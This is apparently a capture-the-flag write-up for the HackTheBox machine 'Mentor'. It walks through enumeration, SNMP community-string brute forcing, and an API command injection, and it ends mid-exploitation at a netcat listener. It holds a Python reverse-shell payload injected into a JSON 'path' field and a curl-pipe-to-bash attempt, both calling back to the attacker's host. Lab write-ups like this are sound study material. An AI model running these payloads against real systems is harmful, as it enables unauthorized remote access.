---
title: HTB: Mentor
url: https://0xdf.gitlab.io/2023/03/11/htb-mentor.html
date: 2023-03-11T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-mentor, hackthebox, ctf, nmap, youtube, snmp, fastapi, flask, feroxbuster, snmp-brute, onesixtyone, snmpwalk, snmpbulkwalk, command-injection, postgresql, chisel, psql, crackstation, password-reuse, htb-forgot, htb-sneaky, oscp-plus-v3
---

![Mentor](https://0xdfimages.gitlab.io/img/mentor-cover.png)

Mentor focuses on abusing a FastAPI API and SNMP enumeration. I’ll brute force a second community string that gives more access than the default “public” string. With that, I’ll get access to the running process command lines, and recover a password. With that password, I can get a valid auth token to the API, and find a backup endpoint that has a command injection vulnerability, which I’ll exploit to get a shell. From inside the web container, I’ll find creds for the database and dump the users table. On cracking the hash for one user, I can get SSH access to the host. For root, I’ll find a password in the SNMP configuration.

## Box Info

| Name | [Mentor](https://hackthebox.com/machines/mentor)  [Mentor](https://hackthebox.com/machines/mentor) [Play on HackTheBox](https://hackthebox.com/machines/mentor) |
| --- | --- |
| Release Date | [10 Dec 2022](https://twitter.com/hackthebox_eu/status/1600882922499805191) |
| Retire Date | 11 Mar 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Mentor |
| Radar Graph | Radar chart for Mentor |
| First Blood User | 01:05:06[irogir irogir](https://app.hackthebox.com/users/476556) |
| First Blood Root | 02:01:10[irogir irogir](https://app.hackthebox.com/users/476556) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.193
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-28 10:56 EST
Nmap scan report for api.mentorquotes.htb (10.10.11.193)
Host is up (0.090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.193
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-28 10:56 EST
Nmap scan report for api.mentorquotes.htb (10.10.11.193)
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  uvicorn
|_http-title: Site doesn't have a title (application/json).
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

UDP `nmap` can be a bit unreliable and slow. I recently made [this video](https://www.youtube.com/watch?v=fzl9g0ZgON8) to show how I like to scan it:

SNMP is open on Mentor:

```

oxdf@hacky$ nmap -p 161 -sCV -sU 10.10.11.193
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-28 15:29 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.086s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 18d22h16m52s
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 18d22h16m52.43s (163541243 timeticks)
Service Info: Host: mentor

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds

```

### mentorquotes.htb - TCP 80

#### Site

Even though `nmap` doesn’t report it, visiting `http://10.10.11.193` returns a 302 redirect to `http://mentorquotes.htb`. The site simply shows some quotes:

[![image-20230228112827012](https://0xdfimages.gitlab.io/img/image-20230228112827012.png)](https://0xdfimages.gitlab.io/img/image-20230228112827012.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230228112827012.png)

No links, nothing else to see.

#### Tech Stack

The HTTP headers show Werkzeug, so this is a Python application, and likely Flask:

```

HTTP/1.1 200 OK
Date: Tue, 28 Feb 2023 16:11:01 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Length: 5506
Connection: close

```

Visiting a page I expect to 404, it shows the [default Flask 404](/2023/03/04/htb-forgot.html#tech-stack):

![image-20230228113011580](https://0xdfimages.gitlab.io/img/image-20230228113011580.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site with no extensions as the box is running Flask:

```

oxdf@hacky$ feroxbuster -u http://mentorquotes.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      167l      621w     5506c http://mentorquotes.htb/
403      GET        9l       28w      281c http://mentorquotes.htb/server-status
[####################] - 1m     30000/30000   0s      found:2       errors:281    
[####################] - 1m     30000/30000   285/s   http://mentorquotes.htb/

```

Nothing by the Apache `server-status` page that I can’t access.

### Subdomain Fuzz

I’ll fuzz for subdomains using `ffuf`. With `ffuf`, it’s important to add `-mc all` to get all codes, as it brings some filters by default that I don’t want for this use-case. I’ll run first without the `-fw 18` and see that the default responses have a varied number of characters, but all have 18 words.

```

oxdf@hacky$ ffuf -u http://10.10.11.193 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.193
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 18
________________________________________________

[Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 89ms]
    * FUZZ: api

:: Progress: [4989/4989] :: Job [1/1] :: 465 req/sec :: Duration: [0:00:10] :: Errors: 0 ::

```

There’s an `api` subdomain, so I’ll add that to my `hosts` file:

```
10.10.11.193 mentorquotes.htb api.mentorquotes.htb

```

### api.mentorquotes.htb

#### 404

The root page returns a 404 not found:

```

HTTP/1.1 404 Not Found
Date: Tue, 28 Feb 2023 22:08:34 GMT
Server: uvicorn
content-length: 22
content-type: application/json
Connection: close

{"detail":"Not Found"}

```

I’ll note this is different than the main site, so it likely isn’t flask. The `Server` header also says `uvicorn`, so it’s likely still Python, and given it’s an API, I’ll guess (correctly) that it’s FastAPI.

#### Brute Force

As the root returns 404, I’ll start with a brute force using `feroxbuster`. I’ll run with `--no-recursion` as the initial run without that finds a wildcard response and tries to recurse into it effectively DOSing my terminal (update - this is fixed - see [this video](https://www.youtube.com/watch?v=d4tYWJzZ8QE)). I’m also using `--methods GET,POST` to check both methods:

```

oxdf@hacky$ feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 🏁  HTTP methods          │ [GET, POST]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
307     POST        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
405     POST        1l        3w       31c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307     POST        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c http://api.mentorquotes.htb/quotes => http://api.mentorquotes.htb/quotes/
307     POST        0l        0w        0c http://api.mentorquotes.htb/quotes => http://api.mentorquotes.htb/quotes/
403      GET        9l       28w      285c http://api.mentorquotes.htb/server-status
403     POST        9l       28w      285c http://api.mentorquotes.htb/server-status
[####################] - 2m     60000/60000   0s      found:10      errors:28     
[####################] - 2m     60000/60000   397/s   http://api.mentorquotes.htb/ 

```

This reveals `/admin`, `/docs`, `/users`, and `/quotes`.

#### /admin

Visiting `/admin` returns a message that the `Authorization` header is missing:

![image-20230228162308308](https://0xdfimages.gitlab.io/img/image-20230228162308308.png)

If I add it in Burp Repeater with a dummy value, it crashes the server:

![image-20230228153614477](https://0xdfimages.gitlab.io/img/image-20230228153614477.png)

`feroxbuster` will find two additional endpoints:

```

oxdf@hacky$ feroxbuster -u http://api.mentorquotes.htb/admin/ --no-recursion --methods GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb/admin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 🏁  HTTP methods          │ [GET, POST]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
405     POST        1l        3w       31c http://api.mentorquotes.htb/admin/check
[####################] - 2m     60000/60000   0s      found:2       errors:4
[####################] - 2m     60000/60000   398/s   http://api.mentorquotes.htb/admin/ 

```

`feroxbuster` flags both with 405 Method Not Allowed status. I’ll check in Repeater to see what the opposite method returns:

![image-20230228162845007](https://0xdfimages.gitlab.io/img/image-20230228162845007.png)

Both return 422 Unprocessable Entity, which isn’t in the match list for `feroxbuster` (worth being aware of). [Update: `feroxbuster` updates makes this more reliable - check out my video [here](https://www.youtube.com/watch?v=d4tYWJzZ8QE).]

#### /docs

`/docs` has the swagger docs for the API:

[![image-20230228163010247](https://0xdfimages.gitlab.io/img/image-20230228163010247.png)](https://0xdfimages.gitlab.io/img/image-20230228163010247.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230228163010247.png)

It doesn’t have the `/admin/` endpoints, but it shows the endpoints for the others identified, as well as `/auth`.

There’s also a username / email at the top, `james@mentorquotes.htb`.

#### /auth/

`/auth/login` requires a body with `email`, `username`, and `password`:

![image-20230228170044189](https://0xdfimages.gitlab.io/img/image-20230228170044189.png)

Without creds, there’s not much to do here. There’s also a `/auth/signup` endpoint. I can run it right in the docs, editing the request body to my values:

![image-20230228170259014](https://0xdfimages.gitlab.io/img/image-20230228170259014.png)

On clicking “Execute”, it responds success (I’m using the username “0xdff” as “0xdf” responds that the username must be at least five characters):

![image-20230228170400947](https://0xdfimages.gitlab.io/img/image-20230228170400947.png)

If I take that username, password, and email combination back to the `/auth/login` endpoint, it works and returns a token:

![image-20230228170506895](https://0xdfimages.gitlab.io/img/image-20230228170506895.png)

#### /users/

This application is coded in a poor way such that the swagger docs to not work for any of the authenticated end points. I’ll use Repeater.

The docs show why `/users/` returned a wildcard response:

![image-20230228163549424](https://0xdfimages.gitlab.io/img/image-20230228163549424.png)

If I GET `/users/0xdf/`, it returns 422:

```

HTTP/1.1 422 Unprocessable Entity
Date: Tue, 28 Feb 2023 21:36:15 GMT
Server: uvicorn
content-length: 273
content-type: application/json
Connection: close

{
  "detail": [
    {
      "loc": [
        "header",
        "Authorization"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "header",
        "Authorization"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "path",
        "id"
      ],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}

```

At the bottom, there’s a complaint that the `id` parameter is not a valid integer. If I replace `0xdf` with `1`, it still has the auth error.

The standard way to add an auth token to a request like this is with a header that looks like `Authorization: Bearer [token]`. That gives a crash:

```

HTTP/1.1 500 Internal Server Error
Date: Tue, 28 Feb 2023 22:08:13 GMT
Server: uvicorn
content-length: 21
content-type: text/plain; charset=utf-8
Connection: close

Internal Server Error

```

For some reason, this API requires removing the standard `Bearer` word:

![image-20230228171140852](https://0xdfimages.gitlab.io/img/image-20230228171140852.png)

That suggests the auth is now working, but as a plain user, I still can’t access this endpoint.

#### /quotes/

The `/quotes/` path also returns the same auth missing error. I can look more closely in the docs and see that the `Authorization` header is a required parameter for each of the endpoints. For example:

![image-20230228164156513](https://0xdfimages.gitlab.io/img/image-20230228164156513.png)

I can read quotes over this endpoint:

![image-20230228171310349](https://0xdfimages.gitlab.io/img/image-20230228171310349.png)

There’s nothing useful here.

### snmp - UDP 161

My [sneaky post](/2021/03/02/htb-sneaky.html#snmp---udp-161) has all the details for getting `snmpwalk` installed and configured. I’ll try the standard community string, “public”, and it does return data, though only about 47 lines, and nothing interesting:

```

oxdf@hacky$ snmpwalk -v2c -c public 10.10.11.193
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (164174741) 19 days, 0:02:27.41
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
...[snip]...
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 229
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

## Shell as root in container

### API Auth as james

#### Bruteforce Community Strings

In SNMP, community strings are kind of like a combination of username and password. The default one is “public”, but there can be others with different levels of access. Tools like [onesixtyone](https://github.com/trailofbits/onesixtyone) and [SNMP-Brute](https://github.com/SECFORCE/SNMP-Brute) are made to brute force community strings, and `nmap` and `hydra` have the ability as well. `onesixtyone` has always been my tool of choice here, but it doesn’t work. On initially publishing this post, I didn’t know but. Props to [Con5ti](https://twitter.com/con5ti) for identifying it:

> Regarding onesixtyone, I just tcpdumped the traffic and it seems that onesixtyone only uses snmp version 1. But I didn't find a way to specify Version 2. Hydra also uses snmp v1 if you specify snmp as the protocol but can be changed to v2c by specifying snmp2://ipaddress.
>
> — Con5ti (@con5ti) [March 13, 2023](https://twitter.com/con5ti/status/1635282974416728069?ref_src=twsrc%5Etfw)

`snmpbrute.py` does check SNMPv2, and as such it identifies two community strings (the second being v2 only):

```

oxdf@hacky$ python /opt/SNMP-Brute/snmpbrute.py -t 10.10.11.193
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
10.10.11.193 : 161      Version (v2c):  internal
10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public
10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...

Identified Community strings
        0) 10.10.11.193    internal (v2c)(RO)
        1) 10.10.11.193    public (v1)(RO)
        2) 10.10.11.193    public (v2c)(RO)
        3) 10.10.11.193    public (v1)(RO)
        4) 10.10.11.193    public (v2c)(RO)
Select Community to Enumerate [0]:

```

I’m not sure why it shows “public” twice. Both “public” and “internal” are read-only (`RO`). The script is offering to use one of these to connect and dump data, but I prefer to do that outside the script.

#### snmpwalk / snmpbulkwalk

Running `snmp-walk` again will dump a lot of data, and take a long time:

```

oxdf@hacky$ time snmpwalk -v2c -c internal 10.10.11.193                                                
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (169158513) 19 days, 13:53:05.13
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
...[snip]...
NOTIFICATION-LOG-MIB::nlmConfigGlobalAgeOut.0 = Gauge32: 1440 minutes
NOTIFICATION-LOG-MIB::nlmStatsGlobalNotificationsLogged.0 = Counter32: 0 notifications
NOTIFICATION-LOG-MIB::nlmStatsGlobalNotificationsBumped.0 = Counter32: 0 notifications

real    11m54.883s
user    0m0.250s
sys     0m0.613s

```

IppSec tipped me off to `snmpbulkwalk` (which is also installed with `apt install snmp`). Instead of making SNMP requests for each item OID (item) as `snmpwalk` does, `snmpbulkwalk` makes bulk requests, so it gets the same data 10 times faster:

```

oxdf@hacky$ time snmpbulkwalk -v2c -c internal 10.10.11.193
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64                      
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (169679061) 19 days, 15:19:50.61                                                       
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
...[snip]...
NOTIFICATION-LOG-MIB::nlmConfigGlobalAgeOut.0 = Gauge32: 1440 minutes
NOTIFICATION-LOG-MIB::nlmStatsGlobalNotificationsLogged.0 = Counter32: 0 notifications
NOTIFICATION-LOG-MIB::nlmStatsGlobalNotificationsBumped.0 = Counter32: 0 notifications

real    1m11.664s
user    0m0.077s
sys     0m0.061s

```

#### SNMP enumeration

Included in this SNMP data is the running process information. The executable is held in `HOST-RESOURCES-MIB::hrSWRunName.[pid]`, like this:

```

HOST-RESOURCES-MIB::hrSWRunName.1691 = STRING: "login.sh"
HOST-RESOURCES-MIB::hrSWRunName.1741 = STRING: "docker-proxy"
HOST-RESOURCES-MIB::hrSWRunName.1768 = STRING: "containerd-shim"
HOST-RESOURCES-MIB::hrSWRunName.1791 = STRING: "postgres"
HOST-RESOURCES-MIB::hrSWRunName.1868 = STRING: "docker-proxy"
HOST-RESOURCES-MIB::hrSWRunName.1887 = STRING: "containerd-shim"
HOST-RESOURCES-MIB::hrSWRunName.1904 = STRING: "postgres"    

```

The full path to the executable is in `HOST-RESOURCES-MIB::hrSWRunPath.[pid]`:

```

HOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: "/bin/bash"
HOST-RESOURCES-MIB::hrSWRunPath.1741 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1768 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.1791 = STRING: "postgres"
HOST-RESOURCES-MIB::hrSWRunPath.1868 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1887 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.1904 = STRING: "postgres: checkpointer "

```

The parameters are in `HOST-RESOURCES-MIB::hrSWRunParameters.[pid]`:

```

HOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.1741 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
HOST-RESOURCES-MIB::hrSWRunParameters.1768 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1791 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1868 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1887 = STRING: "-namespace moby -id 0c815ebc8149995a6f58e5f1b909f6951e3e85bc5936750d849dac30ea82f5ce -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1904 = ""

```

PID 2123 (may differ on your instance) is interesting:

```

HOST-RESOURCES-MIB::hrSWRunName.2123 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunPath.2123 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunParameters.2123 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"

```

`login.py` seems to have a password, “kj23sadkj123as0-d213”.

#### Get Token

This password with james’ name and email from [above](#admin) returns an auth token as james:

![image-20230301114849067](https://0xdfimages.gitlab.io/img/image-20230301114849067.png)

![image-20230301114857362](https://0xdfimages.gitlab.io/img/image-20230301114857362.png)

The token itself doesn’t say anything about being an admin or not (shown here in [jwt.io](https://jwt.io/)):

![image-20230301115149882](https://0xdfimages.gitlab.io/img/image-20230301115149882.png)

But given that james is the site’s admin, it’s worth a try. Because the app is poorly coded, I can’t use Swagger to execute authenticated commands, but in Repeater I am able to do things I couldn’t do before, like dump the users:

![image-20230301115228487](https://0xdfimages.gitlab.io/img/image-20230301115228487.png)

### Endpoint Enumeration

#### users

There are endpoints to get all users, get a user, and create a user. Getting a user returns the same information that came back with all users:

![image-20230301135227026](https://0xdfimages.gitlab.io/img/image-20230301135227026.png)

Creating a user could be interesting, but it doesn’t seem to take any kind of role or admin flag, and I can already create users with the registration endpoint, and already have a token with a user with admin privileges.

#### quotes

With admin auth, I can now create quotes:

![image-20230301135428600](https://0xdfimages.gitlab.io/img/image-20230301135428600.png)

I can’t find much interesting to do with this. I’ll try some basic SQL injections, but nothing.

#### admin

There is a `/admin/` path on the API that isn’t in the Swagger docs. GET `/admin/check` and POST `/admin/backup` are both identified by brute forcing above.

`/admin/check` says it’s not implemented yet:

![image-20230301135631156](https://0xdfimages.gitlab.io/img/image-20230301135631156.png)

Sending a POST to `/admin/backup` returns a 422 error:

![image-20230301135712997](https://0xdfimages.gitlab.io/img/image-20230301135712997.png)

It needs a body. I’ll add `{}` at the end as the body, and change the `Content-Type` to `application/json`. Now it complains about missing the `path` field:

![image-20230301135829383](https://0xdfimages.gitlab.io/img/image-20230301135829383.png)

No matter what I put into a `path` field, it returns “Done!”:

![image-20230301135922522](https://0xdfimages.gitlab.io/img/image-20230301135922522.png)

### Command Injection

#### POC

It’s a bit odd to initiate a backup from an API endpoint, but assuming that is what it’s doing, it is likely taking the input path and running some kind of command (such as `zip` or `tar`) to back up the given path. It’s worth checking if there’s any kind of command injection here. As there’s no output back based on the input path, I’ll try a `ping` to see if I can get Mentor to send ICMP to my host. It works:

![image-20230301141328847](https://0xdfimages.gitlab.io/img/image-20230301141328847.png)

It is important to have the trailing `;` at the end or else it doesn’t work. Likely the box is adding something to the end that leads to an error, but the semicolon just pushes that to the next command.

#### Shell

There are a few things I’ll try that don’t work, including:
- a basic [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in directly in the request;
- base64 encoding that shell and echoing it to decode and then piping into `bash`;
- trying `curl 10.10.14.6/shell.sh | bash` (no connection at my webserver).

The site could be running in a Docker container with very limited commands. I know that the host does have Python, so I’ll grab a one-liner from [revshells.com](https://www.revshells.com/) (“Python3 shortest”) and drop it in:

```

POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Origin: http://api.mentorquotes.htb
Connection: close
Content-Type: application/json
Content-Length: 152

{"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.6\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}

```

On sending this, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
